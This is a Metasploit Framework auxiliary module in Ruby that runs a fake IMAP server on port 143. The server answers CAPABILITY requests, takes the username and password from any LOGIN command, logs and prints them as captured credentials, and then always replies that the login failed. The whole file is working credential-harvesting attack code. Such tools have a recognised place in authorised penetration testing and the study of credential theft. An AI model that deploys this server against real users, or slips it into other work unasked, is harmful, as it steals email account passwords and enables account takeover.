##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##


require 'msf/core'

module Msf

class Auxiliary::Server::Capture::Imap < Msf::Auxiliary

	include Exploit::Remote::TcpServer
	include Auxiliary::Report

	
	def initialize
		super(
			'Name'        => 'Authentication Capture: IMAP',
			'Version'     => '$Revision$',
			'Description'    => %q{
				This module provides a fake IMAP service that
			is designed to capture authentication credentials.
			},
			'Author'      => ['ddz', 'hdm'],
			'License'     => MSF_LICENSE,
			'Actions'     =>
				[
				 	[ 'Capture' ]
				],
			'PassiveActions' => 
				[
					'Capture'
				],
			'DefaultAction'  => 'Capture'
		)

		register_options(
			[
				OptPort.new('SRVPORT',    [ true, "The local port to listen on.", 143 ])
			], self.class)
	end

	def setup
		super
		@state = {}
	end

	def run
		exploit()
	end
	
	def on_client_connect(c)
		@state[c] = {:name => "#{c.peerhost}:#{c.peerport}", :ip => c.peerhost, :port => c.peerport, :user => nil, :pass => nil}
		c.put "* OK IMAP4\r\n"
	end
	
	def on_client_data(c)
		data = c.get_once
		return if not data
		num,cmd,arg = data.strip.split(/\s+/, 3)
		arg ||= ""
		
		
		if(cmd.upcase == "CAPABILITY") 
			c.put "* CAPABILITY IMAP4 IMAP4rev1 IDLE LOGIN-REFERRALS MAILBOX-REFERRALS NAMESPACE LITERAL+ UIDPLUS CHILDREN\r\n"
			c.put "#{num} OK CAPABILITY completed.\r\n"
		end
		
		if(cmd.upcase == "LOGIN")
			@state[c][:user], @state[c][:pass] = arg.split(/\s+/, 2)

			report_auth_info(
				:host      => @state[c][:ip],
				:proto     => 'imap',
				:targ_host => datastore['SRVHOST'],
				:targ_port => datastore['SRVPORT'],
				:user      => @state[c][:user],
				:pass      => @state[c][:pass]
			)
			print_status("IMAP LOGIN #{@state[c][:name]} #{@state[c][:user]} / #{@state[c][:pass]}")
		end

		@state[c][:pass] = data.strip
		c.put "#{num} NO LOGIN FAILURE\r\n"
		return
							
	end
	
	def on_client_close(c)
		@state.delete(c)
	end


end
end
